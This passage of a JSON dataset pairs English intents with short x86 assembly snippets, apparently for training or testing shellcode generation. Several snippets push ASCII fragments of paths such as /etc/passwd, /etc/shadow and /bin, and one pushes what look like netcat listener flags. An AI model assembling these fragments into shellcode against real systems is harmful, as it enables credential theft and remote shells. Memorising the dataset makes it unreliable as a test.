      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x29 to the stack",
    "rewritten_intent": "push the value 0x29 to the stack",
    "snippet": "push 0x29",
    "slot_map": {
      "0x29": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x29 onto the stack",
    "rewritten_intent": "push 0x29 onto the stack",
    "snippet": "push 0x29",
    "slot_map": {
      "0x29": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x2e312e31 onto the stack",
    "rewritten_intent": "push 0x2e312e31 onto the stack",
    "snippet": "push 0x2e312e31",
    "slot_map": {
      "0x2e312e31": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x2e312e31 to the stack",
    "rewritten_intent": "push the value 0x2e312e31 to the stack",
    "snippet": "push 0x2e312e31",
    "slot_map": {
      "0x2e312e31": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x2e323931 onto the stack",
    "rewritten_intent": "push the value 0x2e323931 onto the stack",
    "snippet": "push 0x2e323931",
    "slot_map": {
      "0x2e323931": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x2e323931 to the stack",
    "rewritten_intent": "push 0x2e323931 to the stack",
    "snippet": "push 0x2e323931",
    "slot_map": {
      "0x2e323931": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x2e373231 to the stack",
    "rewritten_intent": "push 0x2e373231 to the stack",
    "snippet": "push 0x2e373231",
    "slot_map": {
      "0x2e373231": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x2e373231 onto the stack",
    "rewritten_intent": "push 0x2e373231 onto the stack",
    "snippet": "push 0x2e373231",
    "slot_map": {
      "0x2e373231": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x2e383631 onto the stack",
    "rewritten_intent": "push the value 0x2e383631 onto the stack",
    "snippet": "push 0x2e383631",
    "slot_map": {
      "0x2e383631": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x2e383631 to the stack",
    "rewritten_intent": "push 0x2e383631 to the stack",
    "snippet": "push 0x2e383631",
    "slot_map": {
      "0x2e383631": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x2f2f2f2f onto the stack",
    "rewritten_intent": "push 0x2f2f2f2f onto the stack",
    "snippet": "push 0x2f2f2f2f",
    "slot_map": {
      "0x2f2f2f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x2f2f2f2f to the stack",
    "rewritten_intent": "push 0x2f2f2f2f to the stack",
    "snippet": "push 0x2f2f2f2f",
    "slot_map": {
      "0x2f2f2f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x2f2f2f2f onto the stack",
    "rewritten_intent": "push the 0x2f2f2f2f onto the stack",
    "snippet": "push 0x2f2f2f2f",
    "slot_map": {
      "0x2f2f2f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x2f2f2f2f onto the stack and point eax to the stack register",
    "rewritten_intent": "push the value 0x2f2f2f2f onto the stack and point eax to the stack register",
    "snippet": "push 0x2f2f2f2f \\n mov eax, esp",
    "slot_map": {
      "0x2f2f2f2f": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x2f2f2f2f onto the stack and point ebx to the stack register",
    "rewritten_intent": "push the value 0x2f2f2f2f onto the stack and point ebx to the stack register",
    "snippet": "push 0x2f2f2f2f \\n mov ebx, esp",
    "slot_map": {
      "0x2f2f2f2f": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x2f2f2f2f onto the stack and point ecx to the stack register",
    "rewritten_intent": "push the value 0x2f2f2f2f onto the stack and point ecx to the stack register",
    "snippet": "push 0x2f2f2f2f \\n mov ecx, esp",
    "slot_map": {
      "0x2f2f2f2f": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x2f2f2f2f onto the stack and point edi to the stack register",
    "rewritten_intent": "push the value 0x2f2f2f2f onto the stack and point edi to the stack register",
    "snippet": "push 0x2f2f2f2f \\n mov edi, esp",
    "slot_map": {
      "0x2f2f2f2f": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x2f2f2f2f onto the stack and point edx to the stack register",
    "rewritten_intent": "push the value 0x2f2f2f2f onto the stack and point edx to the stack register",
    "snippet": "push 0x2f2f2f2f \\n mov edx, esp",
    "slot_map": {
      "0x2f2f2f2f": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x2f2f2f2f onto the stack and point esi to the stack register",
    "rewritten_intent": "push the value 0x2f2f2f2f onto the stack and point esi to the stack register",
    "snippet": "push 0x2f2f2f2f \\n mov esi, esp",
    "slot_map": {
      "0x2f2f2f2f": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the 0x2f2f2f6e onto the stack",
    "rewritten_intent": "push the 0x2f2f2f6e onto the stack",
    "snippet": "push 0x2f2f2f6e",
    "slot_map": {
      "0x2f2f2f6e": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x2f3a706d onto the stack",
    "rewritten_intent": "push 0x2f3a706d onto the stack",
    "snippet": "push 0x2f3a706d",
    "slot_map": {
      "0x2f3a706d": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x2f3a746f onto the stack",
    "rewritten_intent": "push 0x2f3a746f onto the stack",
    "snippet": "push 0x2f3a746f",
    "slot_map": {
      "0x2f3a746f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x2f656c2d onto the stack",
    "rewritten_intent": "push 0x2f656c2d onto the stack",
    "snippet": "push 0x2f656c2d",
    "slot_map": {
      "0x2f656c2d": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x2f656c2d onto the stack",
    "rewritten_intent": "push the 0x2f656c2d onto the stack",
    "snippet": "push 0x2f656c2d",
    "slot_map": {
      "0x2f656c2d": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x2f6e6962 to the stack",
    "rewritten_intent": "push 0x2f6e6962 to the stack",
    "snippet": "push 0x2f6e6962",
    "slot_map": {
      "0x2f6e6962": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x2f6e6962 onto the stack",
    "rewritten_intent": "push 0x2f6e6962 onto the stack",
    "snippet": "push 0x2f6e6962",
    "slot_map": {
      "0x2f6e6962": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x30 onto the stack",
    "rewritten_intent": "push the value 0x30 onto the stack",
    "snippet": "push 0x30",
    "slot_map": {
      "0x30": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x30313a31 to the stack",
    "rewritten_intent": "push 0x30313a31 to the stack",
    "snippet": "push 0x30313a31",
    "slot_map": {
      "0x30313a31": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x30313a31 onto the stack",
    "rewritten_intent": "push 0x30313a31 onto the stack",
    "snippet": "push 0x30313a31",
    "slot_map": {
      "0x30313a31": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x30317974 onto the stack",
    "rewritten_intent": "push 0x30317974 onto the stack",
    "snippet": "push 0x30317974",
    "slot_map": {
      "0x30317974": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x30317974 onto the stack",
    "rewritten_intent": "push the 0x30317974 onto the stack",
    "snippet": "push 0x30317974",
    "slot_map": {
      "0x30317974": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x31313131 onto the stack",
    "rewritten_intent": "push 0x31313131 onto the stack",
    "snippet": "push 0x31313131",
    "slot_map": {
      "0x31313131": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x3131313a onto the stack",
    "rewritten_intent": "push 0x3131313a onto the stack",
    "snippet": "push 0x3131313a",
    "slot_map": {
      "0x3131313a": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x31373737 onto the stack",
    "rewritten_intent": "push 0x31373737 onto the stack",
    "snippet": "push 0x31373737",
    "slot_map": {
      "0x31373737": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x31373737 onto the stack",
    "rewritten_intent": "push the 0x31373737 onto the stack",
    "snippet": "push 0x31373737",
    "slot_map": {
      "0x31373737": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x3170762d onto the stack",
    "rewritten_intent": "push 0x3170762d onto the stack",
    "snippet": "push 0x3170762d",
    "slot_map": {
      "0x3170762d": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x3170762d to the stack",
    "rewritten_intent": "push the value 0x3170762d to the stack",
    "snippet": "push 0x3170762d",
    "slot_map": {
      "0x3170762d": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x3170762d onto the stack",
    "rewritten_intent": "push the 0x3170762d onto the stack",
    "snippet": "push 0x3170762d",
    "slot_map": {
      "0x3170762d": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x32322e32 onto the stack",
    "rewritten_intent": "push 0x32322e32 onto the stack",
    "snippet": "push 0x32322e32",
    "slot_map": {
      "0x32322e32": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x32322e32 to the stack",
    "rewritten_intent": "push 0x32322e32 to the stack",
    "snippet": "push 0x32322e32",
    "slot_map": {
      "0x32322e32": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x3458652e onto the stack",
    "rewritten_intent": "push 0x3458652e onto the stack",
    "snippet": "push 0x3458652e",
    "slot_map": {
      "0x3458652e": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x37373333 to the stack",
    "rewritten_intent": "push 0x37373333 to the stack",
    "snippet": "push 0x37373333",
    "slot_map": {
      "0x37373333": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x37373333 onto the stack",
    "rewritten_intent": "push the 0x37373333 onto the stack",
    "snippet": "push 0x37373333",
    "slot_map": {
      "0x37373333": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x37373333 onto the stack",
    "rewritten_intent": "push 0x37373333 onto the stack",
    "snippet": "push 0x37373333",
    "slot_map": {
      "0x37373333": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x3a303a3a onto the stack",
    "rewritten_intent": "push 0x3a303a3a onto the stack",
    "snippet": "push 0x3a303a3a",
    "slot_map": {
      "0x3a303a3a": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x3a30754a onto the stack",
    "rewritten_intent": "push 0x3a30754a onto the stack",
    "snippet": "push 0x3a30754a",
    "slot_map": {
      "0x3a30754a": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x3d4c4c41 onto the stack",
    "rewritten_intent": "push the value 0x3d4c4c41 onto the stack",
    "snippet": "push 0x3d4c4c41",
    "slot_map": {
      "0x3d4c4c41": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x3d4c4c41 onto the stack",
    "rewritten_intent": "push 0x3d4c4c41 onto the stack",
    "snippet": "push 0x3d4c4c41",
    "slot_map": {
      "0x3d4c4c41": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x3e0a7964 onto the stack",
    "rewritten_intent": "push 0x3e0a7964 onto the stack",
    "snippet": "push 0x3e0a7964",
    "slot_map": {
      "0x3e0a7964": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x4 onto the stack",
    "rewritten_intent": "push 0x4 onto the stack",
    "snippet": "push 0x4",
    "slot_map": {
      "0x4": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x4 onto the stack",
    "rewritten_intent": "push the value 0x4 onto the stack",
    "snippet": "push 0x4",
    "slot_map": {
      "0x4": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x45683933 onto the stack",
    "rewritten_intent": "push 0x45683933 onto the stack",
    "snippet": "push 0x45683933",
    "slot_map": {
      "0x45683933": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x46 onto the stack",
    "rewritten_intent": "push 0x46 onto the stack",
    "snippet": "push 0x46",
    "slot_map": {
      "0x46": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x4c4c4128 onto the stack",
    "rewritten_intent": "push 0x4c4c4128 onto the stack",
    "snippet": "push 0x4c4c4128",
    "slot_map": {
      "0x4c4c4128": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x4c4c4128 onto the stack",
    "rewritten_intent": "push the value 0x4c4c4128 onto the stack",
    "snippet": "push 0x4c4c4128",
    "slot_map": {
      "0x4c4c4128": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x4c5a304b onto the stack",
    "rewritten_intent": "push 0x4c5a304b onto the stack",
    "snippet": "push 0x4c5a304b",
    "slot_map": {
      "0x4c5a304b": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x4f4e2029 onto the stack",
    "rewritten_intent": "push the value 0x4f4e2029 onto the stack",
    "snippet": "push 0x4f4e2029",
    "slot_map": {
      "0x4f4e2029": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x4f4e2029 onto the stack",
    "rewritten_intent": "push 0x4f4e2029 onto the stack",
    "snippet": "push 0x4f4e2029",
    "slot_map": {
      "0x4f4e2029": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x5 onto the stack",
    "rewritten_intent": "push 0x5 onto the stack",
    "snippet": "push 0x5",
    "slot_map": {
      "0x5": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x5 onto the stack",
    "rewritten_intent": "push the 0x5 onto the stack",
    "snippet": "push 0x5",
    "slot_map": {
      "0x5": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x50446862 onto the stack",
    "rewritten_intent": "push 0x50446862 onto the stack",
    "snippet": "push 0x50446862",
    "slot_map": {
      "0x50446862": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x53534150 onto the stack",
    "rewritten_intent": "push the 0x53534150 onto the stack",
    "snippet": "push 0x53534150",
    "slot_map": {
      "0x53534150": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x53534150 onto the stack",
    "rewritten_intent": "push 0x53534150 onto the stack",
    "snippet": "push 0x53534150",
    "slot_map": {
      "0x53534150": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x6 onto the stack",
    "rewritten_intent": "push 0x6 onto the stack",
    "snippet": "push 0x6",
    "slot_map": {
      "0x6": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x6 value onto the stack",
    "rewritten_intent": "push the 0x6 value onto the stack",
    "snippet": "push 0x6",
    "slot_map": {
      "0x6": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "value",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x61622f2f onto the stack",
    "rewritten_intent": "push 0x61622f2f onto the stack",
    "snippet": "push 0x61622f2f",
    "slot_map": {
      "0x61622f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x61622f6e onto the stack",
    "rewritten_intent": "push 0x61622f6e onto the stack",
    "snippet": "push 0x61622f6e",
    "slot_map": {
      "0x61622f6e": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x61655220 onto the stack",
    "rewritten_intent": "push 0x61655220 onto the stack",
    "snippet": "push 0x61655220",
    "slot_map": {
      "0x61655220": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x6168732f onto the stack",
    "rewritten_intent": "push 0x6168732f onto the stack",
    "snippet": "push 0x6168732f",
    "slot_map": {
      "0x6168732f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x6168732f to the stack",
    "rewritten_intent": "push 0x6168732f to the stack",
    "snippet": "push 0x6168732f",
    "slot_map": {
      "0x6168732f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x6168732f onto the stack",
    "rewritten_intent": "push the value 0x6168732f onto the stack",
    "snippet": "push 0x6168732f",
    "slot_map": {
      "0x6168732f": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x6168732f and the value 0x6374652f onto the stack and point the ebx register to the stack register",
    "rewritten_intent": "push the value 0x6168732f and the value 0x6374652f onto the stack and point the ebx register to the stack register",
    "snippet": "push 0x6168732f \\n push 0x6374652f \\n mov ebx, esp",
    "slot_map": {
      "0x6168732f": "var0",
      "0x6374652f": "var1",
      "ebx": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push 0x61702f2f onto the stack",
    "rewritten_intent": "push 0x61702f2f onto the stack",
    "snippet": "push 0x61702f2f",
    "slot_map": {
      "0x61702f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x61702f2f and the value 0x6374652f onto the stack and point the eax register to the stack register",
    "rewritten_intent": "push the value 0x61702f2f and the value 0x6374652f onto the stack and point the eax register to the stack register",
    "snippet": "push 0x61702f2f \\n push 0x6374652f \\n mov eax, esp",
    "slot_map": {
      "0x61702f2f": "var0",
      "0x6374652f": "var1",
      "eax": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ebx register to the stack register",
    "rewritten_intent": "push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ebx register to the stack register",
    "snippet": "push 0x61702f2f \\n push 0x6374652f \\n mov ebx, esp",
    "slot_map": {
      "0x61702f2f": "var0",
      "0x6374652f": "var1",
      "ebx": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ecx register to the stack register",
    "rewritten_intent": "push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ecx register to the stack register",
    "snippet": "push 0x61702f2f \\n push 0x6374652f \\n mov ecx, esp",
    "slot_map": {
      "0x61702f2f": "var0",
      "0x6374652f": "var1",
      "ecx": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edi register to the stack register",
    "rewritten_intent": "push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edi register to the stack register",
    "snippet": "push 0x61702f2f \\n push 0x6374652f \\n mov edi, esp",
    "slot_map": {
      "0x61702f2f": "var0",
      "0x6374652f": "var1",
      "edi": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edx register to the stack register",
    "rewritten_intent": "push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edx register to the stack register",
    "snippet": "push 0x61702f2f \\n push 0x6374652f \\n mov edx, esp",
    "slot_map": {
      "0x61702f2f": "var0",
      "0x6374652f": "var1",
      "edx": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x61702f2f and the value 0x6374652f onto the stack and point the esi register to the stack register",
    "rewritten_intent": "push the value 0x61702f2f and the value 0x6374652f onto the stack and point the esi register to the stack register",
    "snippet": "push 0x61702f2f \\n push 0x6374652f \\n mov esi, esp",
    "slot_map": {
      "0x61702f2f": "var0",
      "0x6374652f": "var1",
      "esi": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the 0x61702f63 onto the stack",
    "rewritten_intent": "push the 0x61702f63 onto the stack",
    "snippet": "push 0x61702f63",
    "slot_map": {
      "0x61702f63": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x61702f63 onto the stack",
    "rewritten_intent": "push 0x61702f63 onto the stack",
    "snippet": "push 0x61702f63",
    "slot_map": {
      "0x61702f63": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x622f7273 onto the stack",
